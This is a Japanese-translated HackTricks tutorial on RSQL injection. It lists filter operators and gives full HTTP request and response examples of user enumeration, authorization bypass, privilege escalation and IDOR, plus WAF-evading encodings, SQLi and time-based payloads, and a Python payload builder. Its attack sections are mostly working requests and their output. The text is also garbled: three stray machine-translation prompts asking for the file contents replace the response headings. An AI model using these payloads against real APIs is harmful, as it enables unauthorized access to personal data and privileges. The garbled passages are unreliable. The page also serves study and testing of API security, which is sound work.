# RSQL Injection

{{#include ../banners/hacktricks-training.md}}

## RSQLとは？
RSQLは、RESTful APIsにおける入力のパラメータ化されたフィルタリングのために設計されたクエリ言語です。FIQL (Feed Item Query Language) に基づき、もともとは Mark Nottingham が Atom フィードのクエリ用途で仕様化したもので、RSQLはそのシンプルさと、複雑なクエリをコンパクトかつURI準拠の形でHTTP上で表現できる点が特徴です。これによりRESTエンドポイントの検索用一般的なクエリ言語として優れた選択肢になります。

## 概要
RSQL Injectionは、RESTful APIsでクエリ言語としてRSQLを使用するウェブアプリケーションに存在する脆弱性です。 [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) や [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection) と同様に、この脆弱性はRSQLフィルタが適切にサニタイズされていない場合に発生し、攻撃者が悪意のあるクエリを注入して権限なくデータにアクセス、変更、削除できてしまいます。

## 仕組みは？
RSQLを使うとRESTful APIsで高度なクエリを構築できます。例えば:
```bash
/products?filter=price>100;category==electronics
```
これは、products を price が 100 より大きく、category が “electronics” の条件でフィルタする構造化クエリに変換されます。

アプリケーションがユーザー入力を適切に検証しない場合、攻撃者はフィルタを操作して予期しないクエリを実行させる可能性があります。例えば:
```bash
/products?filter=id=in=(1,2,3);delete_all==true
```
あるいは、Boolean queries や nested subqueries を利用して機密情報を抽出することさえ可能です。

## Risks
- **Exposure of sensitive data:** 攻撃者がアクセスしてはならない情報を取得できる可能性があります。
- **Data modification or deletion:** データベースレコードを変更するフィルタを注入される可能性があります。
- **Privilege escalation:** フィルタを使って識別子を操作し、他のユーザの権限でアクセスさせるなどアプリケーションを騙すことで権限昇格が起こり得ます。
- **Evasion of access controls:** フィルタを操作して制限されたデータへアクセスされる可能性があります。
- **Impersonation or IDOR:** フィルタでユーザ間の識別子を改変され、正しく認証されていないにもかかわらず他ユーザの情報やリソースにアクセスできてしまう可能性があります。

## Supported RSQL operators
| Operator  | Description | Example  |
|:----: |:----: |:------------------:|
| `;` / `and` | 論理的な **AND** 演算子。両方の条件が*true*の場合に行をフィルタします | `/api/v2/myTable?q=columnA==valueA;columnB==valueB` |
| `,` / `or` | 論理的な **OR** 演算子。少なくとも一方の条件が*true*の場合に行をフィルタします | `/api/v2/myTable?q=columnA==valueA,columnB==valueB` |
| `==` | **equals** クエリを実行します。*myTable* の *columnA* の値が *queryValue* と完全に一致するすべての行を返します | `/api/v2/myTable?q=columnA==queryValue` |
| `=q=` | **search** クエリを実行します。*myTable* の *columnA* の値が *queryValue* を含むすべての行を返します | `/api/v2/myTable?q=columnA=q=queryValue` |
| `=like=` | **like** クエリを実行します。*myTable* の *columnA* の値が *queryValue* に類似するすべての行を返します | `/api/v2/myTable?q=columnA=like=queryValue` |
| `=in=` | **in** クエリを実行します。*columnA* が *valueA* または *valueB* を含む *myTable* のすべての行を返します | `/api/v2/myTable?q=columnA=in=(valueA, valueB)` |
| `=out=` | **exclude** クエリを実行します。*columnA* の値が *valueA* でも *valueB* でもない *myTable* のすべての行を返します | `/api/v2/myTable?q=columnA=out=(valueA,valueB)` |
| `!=` | *not equals* クエリを実行します。*myTable* の *columnA* の値が *queryValue* と等しくないすべての行を返します | `/api/v2/myTable?q=columnA!=queryValue` |
| `=notlike=` | **not like** クエリを実行します。*myTable* の *columnA* の値が *queryValue* に類似しないすべての行を返します | `/api/v2/myTable?q=columnA=notlike=queryValue` |
| `<` & `=lt=` | **lesser than** クエリを実行します。*myTable* の *columnA* の値が *queryValue* より小さいすべての行を返します | `/api/v2/myTable?q=columnA<queryValue` <br> `/api/v2/myTable?q=columnA=lt=queryValue` |
| `=le=` & `<=` | **lesser than** または **equal to** クエリを実行します。*myTable* の *columnA* の値が *queryValue* 以下であるすべての行を返します | `/api/v2/myTable?q=columnA<=queryValue` <br> `/api/v2/myTable?q=columnA=le=queryValue` |
| `>` & `=gt=` | **greater than** クエリを実行します。*myTable* の *columnA* の値が *queryValue* より大きいすべての行を返します | `/api/v2/myTable?q=columnA>queryValue` <br> `/api/v2/myTable?q=columnA=gt=queryValue` |
| `>=` & `=ge=` | **equal to** または **greater than** クエリを実行します。*myTable* の *columnA* の値が *queryValue* 以上であるすべての行を返します | `/api/v2/myTable?q=columnA>=queryValue` <br> `/api/v2/myTable?q=columnA=ge=queryValue` |
| `=rng=` | **from to** クエリを実行します。*columnA* の値が *fromValue* 以上かつ *toValue* 以下である *myTable* のすべての行を返します | `/api/v2/myTable?q=columnA=rng=(fromValue,toValue)` |

**Note**: Table based on information from [**MOLGENIS**](https://molgenis.gitbooks.io/molgenis/content/) and [**rsql-parser**](https://github.com/jirutka/rsql-parser) applications.

#### Examples
- name=="Kill Bill";year=gt=2003
- name=="Kill Bill" and year>2003
- genres=in=(sci-fi,action);(director=='Christopher Nolan',actor==*Bale);year=ge=2000
- genres=in=(sci-fi,action) and (director=='Christopher Nolan' or actor==*Bale) and year>=2000
- director.lastName==Nolan;year=ge=2000;year=lt=2010
- director.lastName==Nolan and year>=2000 and year<2010
- genres=in=(sci-fi,action);genres=out=(romance,animated,horror),director==Que*Tarantino
- genres=in=(sci-fi,action) and genres=out=(romance,animated,horror) or director==Que*Tarantino

**Note**: Table based on information from [**rsql-parser**](https://github.com/jirutka/rsql-parser) application.

## Common filters
これらのフィルタは API のクエリを絞り込むのに役立ちます：

| Filter | Description | Example |
|--------|------------|---------|
| `filter[users]` | 特定のユーザによって結果をフィルタします | `/api/v2/myTable?filter[users]=123` |
| `filter[status]` | ステータス（active/inactive、completed など）でフィルタします | `/api/v2/orders?filter[status]=active` |
| `filter[date]` | 日付範囲内で結果をフィルタします | `/api/v2/logs?filter[date]=gte:2024-01-01` |
| `filter[category]` | カテゴリやリソースタイプでフィルタします | `/api/v2/products?filter[category]=electronics` |
| `filter[id]` | 一意の識別子でフィルタします | `/api/v2/posts?filter[id]=42` |


## Common parameters
これらのパラメータは API レスポンスの最適化に役立ちます：

| Parameter | Description | Example |
|-----------|------------|---------|
| `include` | レスポンスに関連リソースを含めます | `/api/v2/orders?include=customer,items` |
| `sort` | 結果を昇順または降順でソートします | `/api/v2/users?sort=-created_at` |
| `page[size]` | 1ページあたりの結果数を制御します | `/api/v2/products?page[size]=10` |
| `page[number]` | ページ番号を指定します | `/api/v2/products?page[number]=2` |
| `fields[resource]` | レスポンスで返すフィールドを定義します | `/api/v2/users?fields[users]=id,name,email` |
| `search` | より柔軟な検索を実行します | `/api/v2/posts?search=technology` |

## Information leakage and enumeration of users
次のリクエストは、登録エンドポイントが email パラメータを必要とし、そのメールアドレスが登録されているかどうかをチェックして、データベースに存在するか否かに応じて true または false を返す例を示します：
### Request
```
GET /api/registrations HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
翻訳する対象の英語テキスト（src/pentesting-web/rsql-injection.md の内容）を貼り付けてください。タグ・コード・リンクはそのまま残して翻訳します。
```
HTTP/1.1 400
Date: Sat, 22 Mar 2025 14:47:14 GMT
Content-Type: application/vnd.api+json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
Content-Length: 85

{
"errors": [{
"code": "BLANK",
"detail": "Missing required param: email",
"status": "400"
}]
}
```
通常は `/api/registrations?email=<emailAccount>` が想定されますが、RSQL フィルタを使って特殊なオペレーターによりユーザー情報を列挙したり抽出したりすることが可能です：
### リクエスト
```
GET /api/registrations?filter[userAccounts]=email=='test@test.com' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://locahost:3000
Connection: keep-alive
Referer: https://locahost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
翻訳する元のテキストを送ってください。src/pentesting-web/rsql-injection.md の内容をここに貼り付けてください。コード、タグ、リンク、パスは翻訳しません。
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:09:38 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 38
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"attributes": {
"tenants": []
}
}
}
```
有効なメールアカウントと一致した場合、アプリケーションはサーバーへの応答で古典的な *“true”*、*"1"* のようなものの代わりにユーザーの情報を返します:
### Request
```
GET /api/registrations?filter[userAccounts]=email=='manuel**********@domain.local' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### レスポンス
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:19:46 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 293
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"id": "********************",
"type": "UserAccountDTO",
"attributes": {
"id": "********************",
"type": "UserAccountDTO",
"email": "manuel**********@domain.local",
"sub": "*********************",
"status": "ACTIVE",
"tenants": [{
"id": "1"
}]
}
}
}
```
## Authorization evasion
このシナリオでは、基本ロールを持つユーザーから開始し、データベースに登録されているすべてのユーザーの一覧にアクセスするための特権（例: administrator）がありません:
### リクエスト
```
GET /api/users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Response
```
HTTP/1.1 403
Date: Sat, 22 Mar 2025 14:40:07 GMT
Content-Length: 0
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
```
再び filters と special operators を利用して、ユーザー情報を取得し、アクセス制御を回避する別の方法を用います。
例えば、ユーザーの *ID* に文字 “*a*” を含む *ユーザー* をフィルタする例:
### Request
```
GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### レスポンス
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:43:28 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 1434192
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "********A***********",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "************",
"email": "**********@domain.local",
"firstName": "rafael",
"surname": "************",
"telephoneCountryCode": "**",
"mobilePhone": "*********",
"taxIdentifier": "********",
"languageId": 1,
"createdAt": "2024-08-09T10:57:41.237Z",
"termsOfUseAccepted": true,
"id": "******************",
"type": "UserGetResponseCustomDTO"
}
}, {
"id": "*A*******A*****A*******A******",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": ""************",
"email": "juan*******@domain.local",
"firstName": "juan",
"surname": ""************",",
"telephoneCountryCode": "**",
"mobilePhone": "************",
"taxIdentifier": "************",
"languageId": 1,
"createdAt": "2024-07-18T06:07:37.68Z",
"termsOfUseAccepted": true,
"id": "*******************",
"type": "UserGetResponseCustomDTO"
}
}, {
................
```
## Privilege Escalation
役割によってユーザーの権限をチェックするエンドポイントが見つかることは非常に多い。例えば、権限を持たないユーザーを扱っているケース：
### リクエスト
```
GET /api/companyUsers?include=role HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb......
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Response
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:08 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 11
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": []
}
```
特定の演算子を使用すると、管理者ユーザーを列挙できます：
### リクエスト
```
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJh.....
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Response
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:45 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 361
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"type": "CompanyUserGetResponseDTO",
"attributes": {
"companyId": "FA**************",
"companyTaxIdentifier": "B999*******",
"bizName": "company sl",
"email": "jose*******@domain.local",
"userRole": {
"userRoleId": 1,
"userRoleKey": "general.roles.admin"
},
"companyCountryTranslationKey": "*******",
"type": "CompanyUserGetResponseDTO"
}
}]
}
```
administratorのidentifierを把握した後、対応するfilterをadministratorのidentifierに置き換えるか追加することで、同じ権限を取得してprivilege escalationを実行できる可能性があります:
### Request
```
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ.....
Origin: https:/localhost:3000
Connection: keep-alive
Referer: https:/localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### 応答
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 18:53:00 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 68833
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"meta": {
"Functionalities": [{
"functionalityId": 1,
"permissionId": 1,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.userProfile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 2,
"permissionId": 2,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.my_profile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 3,
"permissionId": 3,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "layout.change_user_data",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 4,
"permissionId": 4,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.configuration",
"type": "FunctionalityPermissionDTO"
}, {
....
}]
}
}
```
## Impersonate or Insecure Direct Object References (IDOR)
`filter` パラメータの使用に加えて、`include` のような他のパラメータを使用でき、これは結果に特定のパラメータ（例: language, country, password...）を含めることを許可します。

以下の例では、ユーザープロファイルの情報が表示されます：
### リクエスト
```
GET /api/users?include=language,country HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
rsql-injection.md の内容をここに貼ってください。コード、タグ、リンク、パス、技術名（例：RSQL、pentesting、クラウド名など）はそのままにし、英語の本文だけを日本語に翻訳して、元の Markdown/HTML 構造を保持して返します。
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:47:27 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 540
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "D5********************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "**********",
"email": "domingo....@domain.local",
"firstName": "Domingo",
"surname": "**********",
"telephoneCountryCode": "**",
"mobilePhone": "******",
"languageId": 1,
"createdAt": "2024-03-11T07:24:57.627Z",
"termsOfUseAccepted": true,
"howMeetUs": "**************",
"id": "D5********************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
フィルタの組み合わせにより、認可制御を回避して他のユーザーのプロファイルにアクセスできます:

### リクエスト
```
GET /api/users?include=language,country&filter[users]=id=='94***************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### 応答
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:50:07 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 520
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "94******************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 2,
"translationKey": "**************",
"email": "jose******@domain.local",
"firstName": "jose",
"surname": "***************",
"telephoneCountryCode": "**",
"mobilePhone": "********",
"taxIdentifier": "*********",
"languageId": 1,
"createdAt": "2024-11-21T08:29:05.833Z",
"termsOfUseAccepted": true,
"id": "94******************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
## 検出 & fuzzing クイックウィン
- RSQL サポートを確認するには、`?filter=id==test`、`?q==test`、または不正な演算子 `=foo=` のような無害なプローブを送信します；冗長な API はしばしばパーサーエラーを leak します（"Unknown operator" / "Unknown property"）。
- 多くの実装は URL パラメータを二重にパースします；`(`、`)`、`*`、`;` を二重エンコード（例: `%2528admin%2529`）して、単純なブロックリストや WAFs を迂回してみてください。
- ワイルドカードを使った Boolean exfil: `filter[users]=email==*%@example.com;status==ACTIVE` と `,` (OR) でロジックを反転してレスポンスサイズを比較します。
- 範囲／近接 leaks: `filter[users]=createdAt=rng=(2024-01-01,2025-01-01)` は正確な ID を知らなくても年単位で素早く列挙できます。

## フレームワーク固有の悪用 (Elide / JPA Specification / JSON:API)
- Elide と多くの Spring Data REST プロジェクトは RSQL を直接 JPA Criteria に変換します。開発者がカスタム演算子（例: `=ilike=`）を追加し、prepared parameters の代わりに文字列連結で predicate を構築している場合、SQLi に発展させることができます（典型的なペイロード: `name=ilike='%%' OR 1=1--'`）。
- Elide の analytic data store は parameterized columns を受け入れます；ユーザ制御の analytic params と RSQL フィルタを組み合わせたことが CVE-2022-24827 の SQLi の根本原因でした。パッチ適用済みのバージョンが正しくパラメータ化していても、同様の手作りコードはしばしば残るので、`${}` を含む `@JoinFilter`/`@ReadPermission` の SpEL 式を探し、`';sleep(5);'` や論理的恒真式を注入してみてください。
- JSON:API バックエンドは一般的に `include` と `filter` の両方を公開します。関連リソースに対するフィルタ（例: `filter[orders]=customer.email==*admin*`）は、relation-level filters が所有権チェックより先に実行されるため、top-level ACLs をバイパスする可能性があります。

## Automation helpers
- **rsql-parser CLI (Java)**: `java -jar rsql-parser.jar "name=='*admin*';status==ACTIVE"` はペイロードをローカルで検証し、抽象構文木を表示します—括弧の整合やカスタム演算子の作成に便利です。
- **Python quick builder**:
```python
from pyrsql import RSQL
payload = RSQL().and_("email==*admin*", "status==ACTIVE").or_("role=in=(owner,admin)")
print(str(payload))
```
- HTTP fuzzer (ffuf, turbo-intruder) と組み合わせ、`=in=` リスト内のワイルドカード位置 `*a*`、`*e*` などを反復して試すことで、ID やメールを素早く列挙します。

## 参考
- [RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
- [RSQL Injection Exploitation](https://m3n0sd0n4ld.github.io/patoHackventuras/rsql_injection_exploitation)
- [Elide filtering & security considerations](https://elide.io/pages/guide/03-analytics.html)

{{#include ../banners/hacktricks-training.md}}
